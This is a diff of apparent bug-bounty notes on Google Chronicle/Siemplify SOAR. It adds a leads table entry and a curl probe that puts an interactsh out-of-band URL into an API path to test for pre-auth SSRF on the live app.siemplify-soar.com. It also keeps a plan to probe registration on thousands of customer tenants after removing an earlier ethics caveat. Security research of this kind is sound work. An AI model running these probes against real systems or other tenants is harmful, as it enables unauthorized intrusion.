@@ -45,12 +45,21 @@ All registration paths (`/register`, `/signup`, `/create-account`, `/auth/regist
 
 **BLOCKER:** All IDOR/SSRF tests require a valid AppKey token from an authenticated SOAR session.
 
+### Google SecOps Has NO Free Trial
+
+Confirmed from `cloud.google.com/security/products/security-operations` pricing page:
+- **Standard**: Base SIEM + SOAR — Contact sales (no price listed)
+- **Enterprise**: Includes UEBA, threat intel, curated detections, Gemini — Contact sales
+- **Enterprise Plus**: Extended data retention, BigQuery UDM — Contact sales
+
+**No free tier. No trial. All require enterprise sales contact.** Confirmed dead end.
+
 ### Options to Get Authenticated Access
 
-1. **Google SecOps free trial** — `cloud.google.com/security/products/security-operations` → creates `{tenant}.backstory.chronicle.security` Chronicle tenant + SOAR; but needs enterprise onboarding (form, sales contact) — not instant
-2. **Request test account** — Contact Google VRP support or Security Operations product team via bughunters.google.com
-3. **Find a SOAR tenant with self-registration** — Check if any of the 12,674 discovered tenants accept new user registration (less ethical — only use if the trial account is the same user's data)
-4. **GitHub / partner programs** — Some Google partners offer SOAR access; check Siemplify legacy partner portal
+1. **Request test account via Google VRP** — Contact bughunters.google.com to request a test account specifically for security research on Chronicle SOAR. This is a legitimate channel and Google may provide access.
+2. **App tenant SSO login** — Try logging into `app.siemplify-soar.com` using Google OAuth if the login page supports it (screenshots showed "Login" — check if Google/SAML SSO is available).
+3. **GitHub / partner programs** — Some Google/Siemplify integration partners have SOAR dev access; check if any offer sandbox environments.
+4. **Alternative route: test other SOAR tenants** — From the 12,674 discovered tenants, check if any demo/sandbox subdomains accept registration.
 
 ### Next Action (from Pi with browser)
 
@@ -69,9 +78,31 @@ for subdomain in demo trial test sandbox dev community; do
 done
 ```
 
+### CRITICAL NEW LEAD — LegacyControllerBaseUrl URL-in-path (potential SSRF without auth)
+
+From the Swagger path list, first entry:
+```
+GET /api/1p/external/v1/{LegacyControllerBaseUrl}:getExternalProviders
+```
+
+The parameter `LegacyControllerBaseUrl` is **directly in the URL path**. If the server makes an outbound request to this URL (to get external provider metadata), this is SSRF. The `1p` prefix = "first party" = often an internal endpoint with no external auth required.
+
+**Test from Pi with OOB listener:**
+```bash
+# Start interactsh first
+interactsh-client -server oast.pro -v &
+OOB_URL="https://<your-id>.oast.pro"
+
+curl -sk --max-time 20 \
+    -H "User-Agent: Mozilla/5.0" \
+    -H "Accept: application/json" \
+    "https://app.siemplify-soar.com/api/1p/external/v1/$(python3 -c "import urllib.parse; print(urllib.parse.quote('${OOB_URL}/1p-ssrf', safe=''))"):getExternalProviders"
+```
+
+**Updated leads table:** Added L008 for this lead (see below).
+
 ### Immediate Action Available (POST endpoint without body auth check)
 
-The `[405]` on `GET /api/external/v1/connectors` suggests the server knows this endpoint.
 Per Swagger, POST `/api/external/v1/connectors` accepts a connector creation payload.
 **Try from Pi:**
 ```bash
@@ -79,13 +110,12 @@ curl -sk --max-time 15 \
     -X POST \
     -H "Accept: application/json" \
     -H "Content-Type: application/json" \
-    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/125.0 Safari/537.36" \
     -d '{}' \
     "https://app.siemplify-soar.com/api/external/v1/connectors"
-# Expect 401 JSON (not HTML) — confirms endpoint and reveals auth error schema
+# Expect 401 JSON — confirms endpoint is real and auth is enforced
 ```
 
-Also probe all Swagger POST endpoints that have no `security: []` override in Swagger spec — these might inherit no-auth from a global missing security definition.
+Also probe all Swagger POST endpoints that have no `security: []` override — these might inherit no-auth from a global missing security definition. Script: `bash scripts/scan-chronicle-api-routes.sh`
 
 ---
 
@@ -326,3 +356,4 @@ Next actions for desktop session:
 | L005 | `backstory-staging.chronicle.security` → Google 404 — domain resolves, apex not routed | TBD | LEAD — staging may have looser auth; probe actual API paths with trial token |
 | L006 | `performence-webhook.siemplify-soar.com` — live webhook endpoint | TBD | LEAD — probe for unauthenticated webhook acceptance or SSRF |
 | L007 | `backstory-dev.chronicle.security` → ÜberProxy DNS fail | Info | CLOSED — internal-only domain, not resolvable externally |
+| L008 | `GET /api/1p/external/v1/{LegacyControllerBaseUrl}:getExternalProviders` — URL-in-path, potential pre-auth SSRF | **High** | PURSUE — test with OOB URL in path segment; `1p` prefix suggests internal endpoint with looser auth |
